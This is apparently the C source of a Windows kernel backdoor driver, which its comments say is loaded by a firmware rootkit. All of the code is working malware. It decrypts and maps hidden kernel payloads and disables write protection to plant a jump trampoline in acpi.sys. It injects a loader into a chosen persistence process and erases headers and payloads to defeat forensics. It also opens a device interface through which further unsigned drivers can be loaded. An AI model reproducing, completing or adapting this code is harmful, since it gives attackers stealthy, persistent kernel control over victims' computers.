#include "stdafx.h"

// make crt functions inline
#pragma intrinsic(strcmp)

#ifdef _AMD64_
#ifdef DEBUG_BUILD

// debug image
#include "loader_debug_dll.h"

#else

// release image
#include "loader_dll.h"

#endif
#endif

#define SYSCALL_UNKNOWN (ULONG)(-1)

// max driver name length in bytes
#define MAX_DRIVER_NAME 0x100

// dummy driver name
#define DRIVER_NAME L"Dummy"
#define DRIVER_NAME_LEN 10

extern "C"
{
NTSTATUS NTAPI DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);

// number of NtProtectVirtualMemory system service
ULONG m_SDT_NtProtectVirtualMemory = SYSCALL_UNKNOWN;

#ifdef _AMD64_

// system services manager stuff for amd64 kernels
PVOID _KiServiceInternal = 0;

#endif
}

BOOLEAN ProcessNotifyRoutineRemove(void);
void ProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create);

NTSTATUS 
NTAPI
DriverEntryDummy(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath
);

PDRIVER_OBJECT m_DriverObject = NULL;
PDEVICE_OBJECT m_DeviceObject = NULL;

UNICODE_STRING m_usDeviceName;
UNICODE_STRING m_usDeviceLink;

PVOID m_AcpiSysBase = NULL;
PVOID m_KernelBase = NULL;

LONG m_Injected = 0;
UNICODE_STRING m_usPersistenceProcess;

PCREATE_PROCESS_NOTIFY_ROUTINE m_NotifyRoutine = NULL;
PVOID m_NotifyRoutineJump = NULL;

PVOID m_Payload = NULL;
ULONG m_PayloadSize = 0;
//--------------------------------------------------------------------------------------
ULONG SyscallNumber(char *lpszName)
{
    ULONG Ret = SYSCALL_UNKNOWN;

    UNICODE_STRING usPath;
    RtlInitUnicodeString(&usPath,  L"\\SystemRoot\\system32\\ntdll.dll");

    PVOID Data = NULL, Image = NULL;
    ULONG DataSize = 0, ImageSize = 0;

    // load ntdll.dll from the disk    
    if (!ReadFromFile(&usPath, &Data, &DataSize))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to read ntdll from the disk\n");
        return SYSCALL_UNKNOWN;
    }
    
    // load image into the memory
    if (LdrImageFromData(Data, DataSize, &Image, &ImageSize))
    {
        // get function addres by name
        ULONG FuncRva = LdrGetProcAddress(Image, lpszName);
        if (FuncRva != 0)
        {
            PUCHAR FuncAddr = (PUCHAR)RVATOVA(Image, FuncRva);

#ifdef _X86_

            // check for mov eax,imm32
            if (*FuncAddr == 0xB8)
            {
                // return imm32 argument (syscall numbr)
                Ret = *(PULONG)((PUCHAR)FuncAddr + 1);
            }

#elif _AMD64_

            // check for mov eax,imm32
            if (*(FuncAddr + 3) == 0xB8)
            {
                // return imm32 argument (syscall numbr)
                Ret = *(PULONG)(FuncAddr + 4);
            }
#endif
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unexpected code for ntdll!%s()\n", lpszName);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate ntdll!%s()\n", lpszName);
        }

        LdrFree(Image);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to load ntdll into the memory\n");
    }
    
    M_FREE(Data);

    return Ret;
}

#define SYSCALL_INIT(_f_)                                                               \
                                                                                        \
    if (m_SDT_##_f_ == SYSCALL_UNKNOWN)                                                 \
    {                                                                                   \
        if ((m_SDT_##_f_ = SyscallNumber(#_f_)) == SYSCALL_UNKNOWN)                     \
        {                                                                               \
            return FALSE;                                                               \
        }                                                                               \
                                                                                        \
        DbgMsg(__FILE__, __LINE__, #_f_ "() syscall number is 0x%.8x\n", m_SDT_##_f_);  \
    }

BOOLEAN SyscallInitialize(void)
{
    SYSCALL_INIT(NtProtectVirtualMemory);

#ifdef _AMD64_

    if (_KiServiceInternal)
    {
        // _KiServiceInternal address is already initialized
        return TRUE;
    }

    // get nt!KiServiceInternal address
    PVOID KernelBase = RuntimeGetModuleBase("ntoskrnl.exe");
    if (KernelBase)
    {
        // get address of nt!ZwCreateFile()
        PUCHAR FuncAddr = (PUCHAR)RuntimeGetProcAddress(KernelBase, "ZwCreateFile");
        if (FuncAddr)
        {
            /*
                Get address of nt!KiServiceInternal() from nt!ZwCreateFile() code:

                    mov     rax, rsp
                    cli
                    sub     rsp, 10h
                    push    rax
                    pushfq
                    push    10h
                    lea     rax, [nt!KiServiceLinkage]
                    push    rax
                    mov     eax, 52h
                    jmp     nt!KiServiceInternal
            */

            PUCHAR JmpAddr = FuncAddr + 25;

            // check for the jmp instruction
            if (*JmpAddr == 0xe9)
            {
                // get jmp operand absolute address
                _KiServiceInternal = (PVOID)((PCHAR)JmpAddr + *(PLONG)(JmpAddr + 1) + 5);
                
                DbgMsg(__FILE__, __LINE__, "nt!KiServiceInternal is at "IFMT"\n", _KiServiceInternal);

                return TRUE;
            }             
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't find nt!KiServiceInternal\n");
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't get address of nt!ZwCreateFile\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't get kernel base address\n");
    } 

    return FALSE;

#else // _AMD64_

    return TRUE;

#endif // _AMD64_
        
}
//--------------------------------------------------------------------------------------
#ifdef _X86_

#define SIZE_OF_JUMP    5

#else _AMD64_

#define SIZE_OF_JUMP    14

#endif

PVOID AllocateJump(PVOID Image, PVOID Dest)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);    

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    // find code section
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        char *lpszName = (char *)&pSection->Name;

        // match section name
        if (!strcmp(lpszName, ".text") &&
            (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
            !(pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE))
        {
            // calculate the real size of section 
            ULONG RealSize = _ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
            ULONG PaddingSize = RealSize - pSection->Misc.VirtualSize;

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Padding size is 0x%x (0x%x needed)\n", PaddingSize, SIZE_OF_JUMP);

            if (PaddingSize > SIZE_OF_JUMP)
            {
                UCHAR ZeroBytes[SIZE_OF_JUMP];
                memset(ZeroBytes, 0, sizeof(ZeroBytes));

                // find section padding
                PUCHAR Padding = RVATOVA(Image, pSection->VirtualAddress + pSection->Misc.VirtualSize);

                for (ULONG p = PaddingSize - SIZE_OF_JUMP; p != 0; p--)
                {
                    PUCHAR Ptr = Padding + p;

                    // check for zero bytes
                    if (!memcmp(Ptr, ZeroBytes, SIZE_OF_JUMP))
                    {
                        clear_wp();
#ifdef _X86_
                        // jmp addr
                        *(PUCHAR)Ptr = 0xe9;
                        *(PULONG)((PUCHAR)Ptr + 1) = (ULONG)((ULONG_PTR)Dest - (ULONG_PTR)Ptr - SIZE_OF_JUMP);
#else _AMD64_
                        // jmp qword [addr]
                        *(PUSHORT)Ptr = 0x25ff;
                        *(PULONG)((PUCHAR)Ptr + 2) = 0;

                        // addr dq XXXh
                        *(PULONGLONG)((PUCHAR)Ptr + 6) = (ULONGLONG)Dest;
#endif
                        set_wp();

                        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Jump to "IFMT" allocated at "IFMT"\n", Dest, Ptr);

                        return Ptr;
                    }
                }
            }
            
            break;
        }

        pSection += 1;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find executable section\n");

    return NULL;
}
//--------------------------------------------------------------------------------------
PDRIVER_OBJECT AllocateDriverObject(PDRIVER_INITIALIZE DriverInit)
{   
    OBJECT_ATTRIBUTES ObjAttr;
    PDRIVER_OBJECT DriverObject = NULL;
    ULONG ObjSize = sizeof(DRIVER_OBJECT) + sizeof(DRIVER_EXTENSION);

    // get object type address
    POBJECT_TYPE *ObjType = (POBJECT_TYPE *)ImportGetProcAddress(I_MODULE_NT, H_IoDriverObjectType);
    if (ObjType == NULL)
    {
        return NULL;
    }

    // allocate driver name
    PWSTR lpszName = DRIVER_NAME;
    PUNICODE_STRING DriverName = (PUNICODE_STRING)
        ExAllocatePool(NonPagedPool, sizeof(UNICODE_STRING) + MAX_DRIVER_NAME);

    if (DriverName == NULL)
    {
        return NULL;
    }

    // fill name and object attributes
    DriverName->Buffer = (PWSTR)(DriverName + 1);
    DriverName->Length = DriverName->MaximumLength = DRIVER_NAME_LEN;
    memcpy(DriverName->Buffer, lpszName, DRIVER_NAME_LEN + sizeof(WCHAR));    
    
    InitializeObjectAttributes(
        &ObjAttr, DriverName, OBJ_PERMANENT | OBJ_CASE_INSENSITIVE,
        NULL, NULL
    );

    // allocate driver object
    NTSTATUS ns = (NTSTATUS)I_ObCreateObject(
        KernelMode, *ObjType, &ObjAttr,
        KernelMode, NULL, ObjSize, 0, 0, &DriverObject
    );
    if (!NT_SUCCESS(ns))
    {
        return NULL;
    }

    memset(DriverObject, 0, ObjSize);

    // fill driver object
    DriverObject->DriverExtension = (PDRIVER_EXTENSION)(DriverObject + 1);
    DriverObject->DriverExtension->DriverObject = DriverObject;
    DriverObject->Type = IO_TYPE_DRIVER;
    DriverObject->Flags = DRVO_BUILTIN_DRIVER;
    DriverObject->Size = sizeof(DRIVER_OBJECT);    
    DriverObject->DriverInit = DriverInit;

    memcpy(&DriverObject->DriverName, DriverName, sizeof(UNICODE_STRING));
    memcpy(&DriverObject->DriverExtension->ServiceKeyName, DriverName, sizeof(UNICODE_STRING));

    return DriverObject;
}
//--------------------------------------------------------------------------------------
BOOLEAN PayloadInject(PCLIENT_ID ClientId, PEPROCESS Process, PVOID Payload, ULONG PayloadSize)
{
    BOOLEAN bRet = FALSE;

    // inject payload into the process
    if (SyscallInitialize() && 
        InjectIntoStartedProcess(ClientId, Process, Payload, PayloadSize))
    {
        bRet = TRUE;                    
    }
        
    return bRet;
}
//--------------------------------------------------------------------------------------
void ProcessNotifyRoutineRemoveThread(PVOID Context)
{
    NTSTATUS ns = PsSetCreateProcessNotifyRoutine(m_NotifyRoutine, TRUE);
    if (NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Process notify routine removed!\n");

        if (m_NotifyRoutineJump)
        {
            // to ensure that clear_wp() and set_wp() calls will be executed on the same CPU
            KeSetSystemAffinityThread(0x00000001);

            clear_wp();

            memset(m_NotifyRoutineJump, 0, SIZE_OF_JUMP);

            set_wp();

            m_NotifyRoutineJump = NULL;
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "PsSetCreateProcessNotifyRoutine() ERROR 0x%.8x\n", ns);
    }
}
//--------------------------------------------------------------------------------------
BOOLEAN ProcessNotifyRoutineRemove(void)
{
    HANDLE hThread = NULL;

    NTSTATUS ns = PsCreateSystemThread(
        &hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, ProcessNotifyRoutineRemoveThread, NULL
    );
    if (NT_SUCCESS(ns))
    {
        ZwClose(hThread);

        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "PsCreateSystemThread() ERROR 0x%.8x\n", ns);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
void DeviceUnregisterThread(PVOID Context)
{
    if (m_DeviceObject)
    {
        // unregister device and its symbolic link
        IoDeleteSymbolicLink(&m_usDeviceLink);
        IoDeleteDevice(m_DeviceObject);

        m_DeviceObject = NULL;

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Device successfully deleted\n");
    }
}
//--------------------------------------------------------------------------------------
BOOLEAN DeviceUnregister(void)
{
    HANDLE hThread = NULL;

    NTSTATUS ns = PsCreateSystemThread(
        &hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DeviceUnregisterThread, NULL
    );
    if (NT_SUCCESS(ns))
    {
        ZwClose(hThread);

        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "PsCreateSystemThread() ERROR 0x%.8x\n", ns);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
void ProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
    if (Create && InterlockedExchangeAdd(&m_Injected, 0) == 0)
    {
        // process created
        PEPROCESS Process = NULL;
        NTSTATUS ns = PsLookupProcessByProcessId(ProcessId, &Process);
        if (NT_SUCCESS(ns))
        {
            #define MAX_PATH 0x100

            ULONG ImagePathLen = (MAX_PATH * sizeof(WCHAR)) + sizeof(UNICODE_STRING);
            PUCHAR ImagePath = (PUCHAR)M_ALLOC(ImagePathLen);
            if (ImagePath)
            {
                UNICODE_STRING *usImagePath = (PUNICODE_STRING)ImagePath;

                CLIENT_ID ClientId;
                ClientId.UniqueProcess = ProcessId;
                ClientId.UniqueThread = NULL;                                            

                // get image path of the process
                if (GetProcessFullImagePathNative(&ClientId, (PVOID)ImagePath, ImagePathLen))
                {
                    DbgMsg(
                        __FILE__, __LINE__, "PROCESS: "IFMT" PID = %d, Path = \"%wZ\"\n", 
                        Process, ProcessId, usImagePath
                    );

                    if (EqualUnicodeString_r(usImagePath, &m_usPersistenceProcess, TRUE))
                    {                  
                        // inject user-mode payload into the process
                        if (PayloadInject(&ClientId, Process, loader, sizeof(loader)))
                        {
                            InterlockedIncrement(&m_Injected);

                            // we don't need this notify routine anymore
                            ProcessNotifyRoutineRemove();
#ifdef USE_ANTI_FORENSICS
                            memset(loader, 0, sizeof(loader));
#endif                                                             
                        }
                    }
                }

                M_FREE(ImagePath);
            }            

            ObDereferenceObject(Process);
        } 
        else 
        {
            DbgMsg(__FILE__, __LINE__, "PsLookupProcessByProcessId() ERROR 0x%.8x\n", ns);
        }
    }
}
//--------------------------------------------------------------------------------------
NTSTATUS LoadDriver(PVOID Data, ULONG DataSize, BOOLEAN bEraseHeaders)
{
    NTSTATUS ns = STATUS_UNSUCCESSFUL;

    PVOID Image = NULL;
    ULONG ImageSize = 0;

    // map image into the memory
    if (LdrImageFromData(Data, DataSize, &Image, &ImageSize))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image address is "IFMT"\n", Image);

        // parse relocations
        if (LdrProcessRelocs(Image, Image))
        {
            // parse imports            
            if (RuntimeProcessImports(Image))
            {
                PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
                    Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

                PDRIVER_INITIALIZE DriverMain = (PDRIVER_INITIALIZE)RVATOVA(
                    Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

                // allocate fake driver object
                PDRIVER_OBJECT DriverObject = AllocateDriverObject(DriverMain);
                if (DriverObject)
                {
                    // call driver entry point
                    ns = DriverMain(DriverObject, &DriverObject->DriverName);

                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image entry returned 0x%.8x\n", ns);

#ifdef USE_ANTI_FORENSICS

                    if (bEraseHeaders)
                    {
                        // erase image headers
                        memset(Image, 0, pHeaders->OptionalHeader.SizeOfHeaders);
                    }
#endif
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: AllocateDriverObject() fails\n");
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RuntimeProcessImports() fails\n");
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrProcessRelocs() fails\n");
        }

        if (!NT_SUCCESS(ns))
        {
            // error while loading image
            LdrFree(Image);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrImageFromData() fails\n");
    }

    return ns;
}
//--------------------------------------------------------------------------------------
BOOLEAN LoadKernelPayload(PVOID Data, ULONG DataSize)
{    
    BOOLEAN bRet = FALSE;
    PPAYLOAD_HEADER pPayloadHeader = (PPAYLOAD_HEADER)Data;    
    ULONG PackedSize = DataSize - sizeof(PAYLOAD_HEADER), UnpackedSize = 0;

    func_RtlDecompressBuffer f_RtlDecompressBuffer = NULL;
        
    // get nt!KiServiceInternal address
    PVOID KernelBase = RuntimeGetModuleBase("ntoskrnl.exe");
    if (KernelBase)
    {
        // get address of nt!f_RtlDecompressBuffer()
        f_RtlDecompressBuffer = (func_RtlDecompressBuffer)RuntimeGetProcAddress(
            KernelBase, "RtlDecompressBuffer");
    }

    if (f_RtlDecompressBuffer == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to obtain needed functions\n");
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Compressed payload size is %d bytes\n", PackedSize);
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Decompressed payload size is %d bytes\n", pPayloadHeader->UnpackedSize);

    RC4_CTX Ctx;

    // decrypt payload
    arc4_set_key(&Ctx, pPayloadHeader->Key, PAYLOAD_KEY_LEN);
    arc4_crypt(&Ctx, pPayloadHeader->Data, PackedSize);

    // allocate memory for uncompressed data
    PVOID UnpackedData = M_ALLOC(pPayloadHeader->UnpackedSize);
    if (UnpackedData)
    {
        // uncompress payload data
        NTSTATUS ns = f_RtlDecompressBuffer(
            P_COMPRESSION_FORMAT_LZNT1 | P_COMPRESSION_ENGINE_STANDARD,
            (PUCHAR)UnpackedData, pPayloadHeader->UnpackedSize,
            (PUCHAR)pPayloadHeader->Data, PackedSize, &UnpackedSize
        );
        if (NT_SUCCESS(ns))
        {
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)UnpackedData;

            // sanity check
            if (UnpackedSize > sizeof(IMAGE_DOS_HEADER) && DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
            {
                PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(UnpackedData, DosHeader->e_lfanew);

                // check for the kernel driver image
                if (bRet = (pHeaders->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE))
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Kernel driver payload found\n");

                    // load and execute kernel driver image
                    LoadDriver(UnpackedData, UnpackedSize, FALSE);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid payload\n");
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RtlDecompressBuffer() fails\n");
        }

        memset(UnpackedData, 0, pPayloadHeader->UnpackedSize);
        M_FREE(UnpackedData);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() fails\n");
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NTSTATUS ns = STATUS_INVALID_DEVICE_REQUEST;
    PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG InSize = 0, OutSize = 0;

    Irp->IoStatus.Status = ns;
    Irp->IoStatus.Information = 0;

    if (Stack->MajorFunction == IRP_MJ_DEVICE_CONTROL) 
    {
        // get IOCTL parameters
        ULONG Code = Stack->Parameters.DeviceIoControl.IoControlCode;                
        PBACKDOOR_DEVICE_REQUEST Request = (PBACKDOOR_DEVICE_REQUEST)Irp->AssociatedIrp.SystemBuffer;

        InSize = Stack->Parameters.DeviceIoControl.InputBufferLength;
        OutSize = Stack->Parameters.DeviceIoControl.OutputBufferLength;        

        // check buffer length
        if (Code == BACKDOOR_IOCTL_REQUEST &&
            InSize >= sizeof(BACKDOOR_DEVICE_REQUEST) && OutSize >= sizeof(BACKDOOR_DEVICE_REQUEST))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IRP_MJ_DEVICE_CONTROL: Code = 0x%.8x\n", Request->Code);

            if (Request->Code == BACKDOOR_CTL_NONE)
            {                
                // do nothing, just return successful status
                ns = STATUS_SUCCESS;
            }
            else if (Request->Code == BACKDOOR_CTL_LOAD_DRIVER)
            {
                // verify buffer length
                if (InSize >= sizeof(BACKDOOR_DEVICE_REQUEST) + Request->LoadDriver.Size)
                {
                    PVOID Image = NULL;
                    ULONG ImageSize = 0;

                    // load and execute kernel driver image
                    ns = LoadDriver(
                        Request->LoadDriver.Data, Request->LoadDriver.Size, 
                        Request->LoadDriver.bEraseHeaders
                    );                    
                }
            }
            else if (Request->Code == BACKDOOR_CTL_UNREGISTER)
            {                
                // create separate thread to unregister driver device
                if (DeviceUnregister())
                {
                    ns = STATUS_SUCCESS;
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "PsCreateSystemThread() ERROR 0x%.8x\n", ns);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unknown control code\n");
            }
        }        

        if (ns == STATUS_SUCCESS)
        {
            Irp->IoStatus.Information = InSize;
        }
    }
    else if (Stack->MajorFunction == IRP_MJ_CREATE) 
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IRP_MJ_CREATE\n");

        ns = STATUS_SUCCESS;
    }
    else if (Stack->MajorFunction == IRP_MJ_CLOSE) 
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IRP_MJ_CLOSE\n");

        ns = STATUS_SUCCESS;
    }

    if (ns != STATUS_PENDING)
    {        
        Irp->IoStatus.Status = ns;             

        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

    return ns;
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI DriverEntryContinue(PVOID Self)
{
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image address is "IFMT"\n", Self);
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Current process is "IFMT"\n", IoGetCurrentProcess());

    RTL_OSVERSIONINFOW VersionInformation;
    RtlGetVersion(&VersionInformation);

    DbgMsg(
        __FILE__, __LINE__, "NT version: %d.%d.%d\n",
        VersionInformation.dwMajorVersion, VersionInformation.dwMinorVersion, 
        VersionInformation.dwBuildNumber
    );    

    BOOLEAN bKernelPayload = FALSE;
    PBACKDOOR_PAYLOAD pPayload = BACKDOOR_PAYLOAD_INFO(Self);

    // check if we have any payload to execute
    if (pPayload->Offset != 0 && pPayload->Size != 0)
    { 
        m_Payload = RVATOVA(Self, pPayload->Offset);
        m_PayloadSize = pPayload->Size;

        // allocate temporary memory for decrypted payload
        PVOID Payload = M_ALLOC(m_PayloadSize);
        if (Payload)
        {
            memcpy(Payload, m_Payload, m_PayloadSize);

            // check if we need to load the payload as kernel driver
            if (bKernelPayload = LoadKernelPayload(Payload, m_PayloadSize))
            {

#ifdef USE_ANTI_FORENSICS

                memset(m_Payload, 0, m_PayloadSize);
#endif
                // kernel mode payload was loaded, we are done now
                m_Payload = NULL;
                m_PayloadSize = 0;
            }

            memset(Payload, 0, pPayload->Size);
            M_FREE(Payload);
        }        
        else
        {
            DbgMsg(__FILE__, __LINE__, "M_ALLOC() fails\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Payload is not present\n");
    }

#ifdef USE_ANTI_FORENSICS

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Self, ((PIMAGE_DOS_HEADER)Self)->e_lfanew);

    memset(Self, 0, pHeaders->OptionalHeader.SizeOfHeaders);

#endif

    if (bKernelPayload)
    {
        return STATUS_SUCCESS;
    }

    // to ensure that clear_wp() and set_wp() calls will be executed on the same CPU
    KeSetSystemAffinityThread(0x00000001);

    ANSI_STRING ProcessName;
    
    RtlInitAnsiString(&ProcessName, DRIVER_INJECT_PROCESS);
    memset(&m_usPersistenceProcess, 0, sizeof(UNICODE_STRING));

    NTSTATUS ns = RtlAnsiStringToUnicodeString(&m_usPersistenceProcess, &ProcessName, TRUE);
    if (NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "Target process name: \"%wZ\"\n", &m_usPersistenceProcess);

        m_NotifyRoutine = ProcessNotifyRoutine;

        // try to register process notify routine just as usual
        ns = PsSetCreateProcessNotifyRoutine(m_NotifyRoutine, FALSE);
        if (ns == STATUS_ACCESS_DENIED && m_AcpiSysBase)
        {
            // fails, allocate process notofy routine trampoline
            PVOID Jump = AllocateJump(m_AcpiSysBase, m_NotifyRoutine);
            if (Jump)
            {
                m_NotifyRoutine = (PCREATE_PROCESS_NOTIFY_ROUTINE)Jump;
                m_NotifyRoutineJump = Jump;

                // try to register notify routine with trampoline
                ns = PsSetCreateProcessNotifyRoutine(m_NotifyRoutine, FALSE);
                if (!NT_SUCCESS(ns))
                {            
                    DbgMsg(__FILE__, __LINE__, "PsSetCreateProcessNotifyRoutine() ERROR 0x%.8x\n", ns);
                }   
            }    
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: AllocateJump() fails\n");
            }        
        }  
        else if (!NT_SUCCESS(ns))
        {
            DbgMsg(__FILE__, __LINE__, "PsSetCreateProcessNotifyRoutine() ERROR 0x%.8x\n", ns);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "RtlAnsiStringToUnicodeString() ERROR 0x%.8x\n", ns);
    }

    // allocate fake DRIVER_OBJECT
    if (m_DriverObject = AllocateDriverObject(NULL))
    {
        DbgMsg(__FILE__, __LINE__, "DRIVER_OBJECT address is "IFMT"\n", m_DriverObject);

        for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i += 1)
        {
            // set IRP dispatch handler
            m_DriverObject->MajorFunction[i] = DriverDispatch;
        }

        RtlInitUnicodeString(&m_usDeviceName, L"\\Device\\" BACKDOOR_DEVICE_NAME);
        RtlInitUnicodeString(&m_usDeviceLink, L"\\DosDevices\\" BACKDOOR_DEVICE_NAME);

        // create communication device
        NTSTATUS ns = IoCreateDevice(
            m_DriverObject, 0, &m_usDeviceName, 
            FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &m_DeviceObject
        );
        if (NT_SUCCESS(ns))
        {
            m_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

            // create win32 symbolic link
            ns = IoCreateSymbolicLink(&m_usDeviceLink, &m_usDeviceName);
            if (NT_SUCCESS(ns))
            {
                return STATUS_SUCCESS;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "IoCreateSymbolicLink() ERROR 0x%.8x\n", ns);
            }

            IoDeleteDevice(m_DeviceObject);
        } 
        else 
        {
            DbgMsg(__FILE__, __LINE__, "IoCreateDevice() ERROR 0x%.8x\n", ns);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: AllocateDriverObject() fails\n");
    }

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
typedef NTSTATUS (NTAPI * REALLOCATED_FUNCTION)(PVOID Self);

NTSTATUS ReallocatedCall(PVOID Self, REALLOCATED_FUNCTION Function)
{
    NTSTATUS ns = STATUS_UNSUCCESSFUL;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Self, ((PIMAGE_DOS_HEADER)Self)->e_lfanew);    

    // allocate mempry for driver image
    PVOID Reallocated = M_ALLOC(pHeaders->OptionalHeader.SizeOfImage);
    if (Reallocated)
    {     
        // copy image to the new location
        memcpy(Reallocated, Self, pHeaders->OptionalHeader.SizeOfImage);        

        // relocate copied image
        LDR_UPDATE_RELOCS(Reallocated, Self, Reallocated);        

        REALLOCATED_FUNCTION ReallocatedFunction = (REALLOCATED_FUNCTION)RVATOVA(
            Reallocated, (ULONG_PTR)Function - (ULONG_PTR)Self);

        // call copied image function
        ns = ReallocatedFunction(Reallocated);

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Status = 0x%.8x\n", ns);

        if (!NT_SUCCESS(ns))
        {
            M_FREE(Reallocated);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() fails\n");
    }    
    
    return ns;
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{        
    if (DriverObject)
    {
        /**
         * Loaded as normal driver.
         */
        PLDR_DATA_TABLE_ENTRY LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

        return DriverEntryContinue(LdrEntry->DllBase);
    }
    else
    {
        /**
         * Loaded by firmware rootkit.
         */
        PBACKDOOR_DRIVER Context = (PBACKDOOR_DRIVER)RegistryPath;        

        // parse relocations
        if (LdrProcessRelocs(Context->ImageBase, Context->ImageBase))
        {
            /** safe to use global variables here **/

            m_AcpiSysBase = Context->TargetBase;
            m_KernelBase = Context->KernelBase;

            // parse imports            
            if (RuntimeProcessImports(Context->ImageBase))
            {
                /** safe to use kernel imports here **/

                if (Context->Flags & DRIVER_FLAG_REALLOCATE)
                {
                    // move driver image to the new memory location
                    return ReallocatedCall(Context->ImageBase, DriverEntryContinue);
                }
                else
                {
                    return DriverEntryContinue(Context->ImageBase);
                }                
            }
        }        
    }

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
